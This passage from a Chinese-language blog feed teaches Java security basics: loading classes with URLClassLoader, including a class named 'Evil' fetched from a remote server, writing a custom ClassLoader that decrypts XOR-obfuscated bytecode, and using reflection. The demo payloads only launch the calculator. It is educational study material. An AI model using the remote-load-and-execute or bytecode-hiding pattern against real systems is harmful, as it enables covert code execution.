<span class="operator">=</span> classLoader.loadClass(<span class="string">"com.Anchor.Evil"</span>);  <span class="comment">//利用该加载器加载URL路径对应的那个恶意类的Class对象</span></span><br><span class="line">        clazz.newInstance(); <span class="comment">//调用该对象的实例化方法，从而触发恶意类的构造函数。</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行后成功弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231224152120913.png" alt="成功弹出计算器"></p><h3 id="加载远程中的外部类"><a href="#加载远程中的外部类" class="headerlink" title="加载远程中的外部类"></a>加载远程中的外部类</h3><p>更多的场景下，我们会将恶意类放到自己远程vps中并开启web服务，然后利用URLClassLoader加载这个远程的恶意类达到命令执行目的。</p><p>这里我就将上面Evil.java文件编译生成的Evil.class文件放到自己阿里服务器上，然后在相应目录下用python开启简易的http服务：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231224151833557.png" alt="在远程服务器上开启http服务"></p><p>将main函数改造如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">"http://xx.xx.xx.xx:9999/"</span>);   <span class="comment">//构造远程恶意class文件的URL对象</span></span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]{url}); <span class="comment">//通过得到的URL对象创建一个URLClassLoader实例。</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">"com.Anchor.Evil"</span>); <span class="comment">//利用该加载器加载URL路径对应的那个恶意类的Class对象</span></span><br><span class="line">        clazz.newInstance();  <span class="comment">//调用该对象的实例化方法，从而触发恶意类的构造函数。</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>成功弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231224151950029.png" alt="成功弹出计算器"></p><h2 id="0x04-自定义类加载器"><a href="#0x04-自定义类加载器" class="headerlink" title="0x04 自定义类加载器"></a>0x04 自定义类加载器</h2><p>除了利用<code>URLClassLoader</code>，我们可以自己继承<code>java.lang.ClassLoader</code>类来构造一个自定义的类加载器。</p><p>通过上面的ClassLoader中的源码分析，我们知道，虽然loadClass是一个加载类的核心方法，但是其内部在实现装载类操作的时后还是通过调用<code>findClass</code>方法来实现的，所以我们要想加载自己自定义的类，就需要覆盖这个<code>findClass</code>方法，而不是<code>loadClass</code>方法。</p><p>以下是如何构造一个自定义类加载器：</p><ol><li>继承ClassLoader类</li><li>覆盖findClass方法</li><li>在findClass()方法中调用defineClass方法</li></ol><p>下面就用一个加密java类字节码例子来演示(模仿的这个大佬的<a href="https://xz.aliyun.com/t/9002#toc-16">博客</a>)：</p><p>首先创建一个<code>CypherTest.java</code>文件，里面有main函数，实现弹出计算器的操作。然后和上文一样，将其编译，得到字节码文件CypherTest.class</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CypherTest</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"cmd /c calc.exe"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231224163702848.png" alt="生成的CypherTest文件"></p><p>之后编写一个加密类Encryption，实现对CypherTest.class文件内容的逐位取反加密。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Encryption</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        encode(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">"G:\\javaSecurity\\javaSec\\out\\production\\javaSec\\com\\Anchor\\CypherTest.class"</span>), <span class="comment">// 获取路径CypherTest.class文件</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">"G:\\javaSecurity\\javaSec\\out\\production\\javaSec\\temp\\com\\Anchor\\CypherTest.class"</span>)); <span class="comment">// 为了保持一致，创建了一个空的temp目录</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(File src, File dest)</span> {</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(src);</span><br><span class="line">            fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(dest);</span><br><span class="line">            <span class="comment">// 逐位取反操作</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((temp = fis.read()) != -<span class="number">1</span>) {<span class="comment">// 读取一个字节</span></span><br><span class="line">                fos.write(temp ^ <span class="number">0xff</span>);<span class="comment">// 取反输出</span></span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        } <span class="keyword">finally</span> { <span class="comment">// 关闭数据流</span></span><br><span class="line">            <span class="keyword">if</span> (fis != <span class="literal">null</span>) {</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    fis.close();</span><br><span class="line">                } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    fos.close();</span><br><span class="line">                } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        System.out.println(<span class="string">"This experiment test is successful"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行后在temp的项目文件中生成了加密的CypherTest.class文件</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231224165229286.png" alt="加密后的CypherTest.class文件"></p><p>因为是自定义的加密，我们无法使用工具直接进行反编译操作和直接使用jvm默认的类加载器去加载它。</p><p>这时候就需要自定义加载器来加载了，我们可以编写一个解密类，用它继承ClassLoader类，修改将CypherTest.class加载进来的方式</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Decryption</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> { <span class="comment">// 继承ClassLoader类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String rootDir;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Decryption</span><span class="params">(String rootDir)</span> {</span><br><span class="line">        <span class="built_in">this</span>.rootDir = rootDir;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// 重写覆盖findClass</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String className) <span class="keyword">throws</span> ClassNotFoundException {</span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(className);</span><br><span class="line">        <span class="keyword">if</span> (c != <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="built_in">this</span>.getParent();</span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                c = parent.loadClass(className);</span><br><span class="line">            } <span class="keyword">catch</span> (ClassNotFoundException e) {</span><br><span class="line">                <span class="comment">// System.out.println("父类无法加载你的class，抛出ClassNotFoundException,已捕获，继续运行");</span></span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="literal">null</span>) {</span><br><span class="line">                System.out.println(<span class="string">"父类成功加载"</span>);</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            } <span class="keyword">else</span> {<span class="comment">// 读取文件 转化成字节数组</span></span><br><span class="line">                <span class="type">byte</span>[] classData = getClassData(className);</span><br><span class="line">                <span class="keyword">if</span> (classData == <span class="literal">null</span>) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">                } <span class="keyword">else</span> { <span class="comment">// 调用defineClass()方法</span></span><br><span class="line">                    c = defineClass(className, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">                    <span class="keyword">return</span> c;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getClassData(String className) {</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> rootDir + <span class="string">"/"</span> + className.replace(<span class="string">'.'</span>, <span class="string">'/'</span>) + <span class="string">".class"</span>;</span><br><span class="line">        <span class="comment">// 将流中的数据转换为字节数组</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            is = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((temp = is.read()) != -<span class="number">1</span>) {</span><br><span class="line">                baos.write(temp ^ <span class="number">0xff</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        } <span class="keyword">finally</span> {</span><br><span class="line">            <span class="keyword">if</span> (is != <span class="literal">null</span>) {</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    is.close();</span><br><span class="line">                } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (baos != <span class="literal">null</span>) {</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    baos.close();</span><br><span class="line">                } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里我们使用将Decryption继承ClassLoader类，之后覆盖findClass()方法，并且在findClass()方法中调用defineClass()方法使用，最后加载我们自定义的getClassData方法去进行解密操作。</p><p>最后我们编写测试的main函数，实例化我们自定义的Decryption得到一个加载器实例，然后用它来加载我们的CypherClass类，从而得到Class对象，通过java反射获取它main函数的Method实例，从而执行main函数。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">Decryption</span> <span class="variable">dLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Decryption</span>(<span class="string">"G:/javaSecurity/javaSec/out/production/javaSec/temp"</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = dLoader.loadClass(<span class="string">"com.Anchor.CypherTest"</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">main</span> <span class="operator">=</span> aClass.getMethod(<span class="string">"main"</span>, String[].class);</span><br><span class="line">        main.invoke(<span class="literal">null</span>,(Object)<span class="keyword">new</span> <span class="title class_">String</span>[]{});</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行该main函数，成功弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231224175352103.png" alt="成功弹出计算器"></p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>相比于类反射，类加载器这部分原理更接近与底层了，这篇只是写了个皮毛。不过最重要的内容还是学会如何编写一个自定义类加载器，这个是挺关键的。</p><p><strong>参考文章：</strong></p><p><a href="https://xz.aliyun.com/t/9002#toc-16">JAVA安全基础（一）–类加载器（ClassLoader）</a></p><p>《深入理解java虚拟机》</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 0-1 javaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射机制</title>
      <link href="/2023/12/23/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/12/23/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天开始，有时间就记录java安全的一些内容。</p><p>借用p神的一句话：Java安全可以从反序列化漏洞开始说起，反序列化漏洞⼜可以从反射开始说起。在很多java漏洞的利用方式中，我们都可以看到java反射的身影。</p><p>第一篇笔记，就从java反射开始记录。本篇需要的前置知识是面向对象的一些基本概念。</p><h2 id="0x01-什么是java反射"><a href="#0x01-什么是java反射" class="headerlink" title="0x01 什么是java反射"></a>0x01 什么是java反射</h2><p>java反射机制是一种间接操作目标对象的机制。在运行时，对于任意一个类，可以知道这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性，这种动态获取信息以及动态调用对象方法的功能称为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><p>看到这个概念可能会感觉还是有些抽象，那先来讲一讲，java具体是怎么实现这个反射机制的。</p><h2 id="0x02-java反射机制的实现"><a href="#0x02-java反射机制的实现" class="headerlink" title="0x02 java反射机制的实现"></a>0x02 java反射机制的实现</h2><p>面向对象中我们知道，一个类中有成员变量，方法、构造方法等信息，而java的反射就是将java类中的各种成分映射成一个个的java对象。</p><p>Java中的java.lang下的Class类与java.lang.reflect类库一起对反射技术进行了全力的支持。在反射包(java.lang.reflect)中，我们常用的类主要Constructor、Method、Field类。通过Class类和这三个类，可以将一个类的各个部分封装成其他对象，从而实现反射机制。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231223160023925.png" alt="java.lang包以及java.lang.reflect包"></p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231223164222033.png" alt="java反射机制简单流程图"></p><p>通过上面这个流程图简要说一下反射机制的流程。我们编写好一个User类的代码文件，然后用javac编译后形成User.class二进制文件，同时jvm内存会查找生成的class文件读入内存，再经过ClassLoader加载，会自动创建一个Class对象，里面拥有获取成员变量，成员方法和构造方法的方法。最后就是我们通过new来创建对象。</p><p>从中我们可以知道，在生成class文件的时候，也创建了Class对象，该对象用于表示我们所编写的类的类型信息。可以这么理解，Class类是所有类的类，而所有类是java.lang.Class类的实例对象，也就是class对象。所以反射机制本身不复杂，就是获取一个类的class对象，然后再通过class对象调用Class类的成员方法获取其成员变量Field实例，成员方法Method实例以及构造器Constructor实例。而在一些漏洞利用场景中，所用的exp往往就是这样获取到一个成员方法，然后传入对应参数来调用它从而达到最终目的。所以，在java安全中，我们着重掌握Class类和Method类即可。</p><p>我们下面就以这个User.java类为例，实现最终能够调用其中的成员函数效果。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>{</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>{}</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, Integer age)</span>{</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>{</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> {</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> {</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    }</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User [name="</span> + name + <span class="string">", age="</span> + age + <span class="string">"]"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="通过java-lang-Class类获取class对象"><a href="#通过java-lang-Class类获取class对象" class="headerlink" title="通过java.lang.Class类获取class对象"></a>通过<code>java.lang.Class</code>类获取class对象</h3><p>上面说到，ClassLoader加载时（关于类加载器的内容下一篇讲），java虚拟机（jvm）会创建一个class对象，而获取一个class对象是反射中最关键的一个操作。在代码中获取class对象的方式的主要有三种：</p><ul><li>通过对象：<code>对象.getClass()</code>   如果上下⽂中存在某个类的实例 <code>obj</code> ，那么我们可以直接通过 <code>obj.getClass()</code> 来获取它的类</li><li>通过全限定类名：<code>Class.forName(全限定类名)</code>   如果你知道某个类的名字，想获取到这个类，就可以使⽤<code>forName</code>这个静态方法来获取</li><li>通过类名： <code>类名.class</code>   如果你已经加载了某个类，只是想获取到它的 <code>java.lang.Class</code> 对象，那么就直接拿它的class属性即可。这个⽅法其实不属于反射。</li></ul><blockquote><p>**全限定类名：**就是类名全称，带包路径的用点隔开，例如本文中用的User类的全限定类名：com.Anchor.User。</p></blockquote><p>其中相对常用或者说比较重要的就是<code>forName()</code>这个静态方法，我们可以在已知一些恶意类的类名的情况下，通过它来获取这些恶意类的class对象，下文还会提到这个<code>forName</code>方法。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="comment">//获取class实例的三种方式</span></span><br><span class="line">        System.out.println(<span class="string">"根据类名:  \t"</span> + User.class);</span><br><span class="line">        System.out.println(<span class="string">"根据对象:  \t"</span> + <span class="keyword">new</span> <span class="title class_">User</span>().getClass());</span><br><span class="line">        System.out.println(<span class="string">"根据全限定类名:\t"</span> + Class.forName(<span class="string">"com.Anchor.User"</span>));</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出结果：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据类名:  <span class="keyword">class</span> <span class="title class_">com</span>.Anchor.User</span><br><span class="line">根据对象:  <span class="keyword">class</span> <span class="title class_">com</span>.Anchor.User</span><br><span class="line">根据全限定类名:<span class="keyword">class</span> <span class="title class_">com</span>.Anchor.User</span><br></pre></td></tr></tbody></table></figure><blockquote><p>这里直接打印获得的class实例从而触发toString方法，不难看出Class类的toString方法默认返回的就是全限定类名。</p></blockquote><p>获得这个class对象后，我们又可以调用以下几个常用的Class类中的成员方法：</p><p><code>class对象.getName()</code> 获取全限定类名</p><p><code>class对象.getSimpleName()</code> 获取类名</p><p><code>class对象.nweInstance()</code>获取该类的实例化对象</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">Class</span> <span class="variable">userClass</span> <span class="operator">=</span> Class.forName(<span class="string">"com.Anchor.User"</span>);</span><br><span class="line">        System.out.println(<span class="string">"获取全限定类名:\t"</span> + userClass.getName());</span><br><span class="line">        System.out.println(<span class="string">"获取类名:\t"</span> + userClass.getSimpleName());</span><br><span class="line">        System.out.println(<span class="string">"实例化:\t"</span> + userClass.newInstance());</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取全限定类名:com.Anchor.User</span><br><span class="line">获取类名:User</span><br><span class="line">实例化:User [name=null, age=0]</span><br></pre></td></tr></tbody></table></figure><p>当然Class类中不止有这几个成员方法，还有一个关键的getMethod方法，下面我们将结合Method类，达到调用成员方法的效果。</p><h3 id="通过java-lang-reflect-Method类获取成员方法"><a href="#通过java-lang-reflect-Method类获取成员方法" class="headerlink" title="通过java.lang.reflect.Method类获取成员方法"></a>通过<code>java.lang.reflect.Method</code>类获取成员方法</h3><p>获取成员方法后调用方法，涉及两个动作，分别两用两个方法实现：</p><ol><li><p>Class类中的<code>getMethod()</code>方法  </p><p> 返回一个 Method 对象，它反映此 Class 对象所表示的类或接口的指定公共成员方法（注意，是公共成员方法，只能获取public方法）。</p></li></ol><blockquote><p>用法:</p><p><code>userClass.getMethod(要获取的成员方法名, 这个成员方法需要的参数类型)</code></p></blockquote><ol start="2"><li>Method类中的<code>invoke()</code>方法。</li></ol><blockquote><p>用法：</p><p><code>method.invoke(调用该方法的对象, 该方法需要传入的参数值)</code></p></blockquote><p>下面我们通过这两个方法实现将一个User实例的”name”属性的值设为”anchor”的操作：</p><figure 